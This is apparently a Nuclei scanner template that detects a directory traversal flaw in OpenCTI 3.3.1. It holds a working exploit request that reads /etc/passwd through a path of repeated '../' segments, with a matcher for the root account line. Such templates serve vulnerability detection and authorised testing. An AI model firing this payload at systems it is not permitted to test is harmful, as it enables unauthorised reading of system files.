id: opencti-lfi

info:
  name: OpenCTI 3.3.1 - Directory Traversal
  author: 0x_Akoko
  severity: high
  reference: https://cxsecurity.com/issue/WLB-2020060078
  tags: opencti,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/static/css//../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
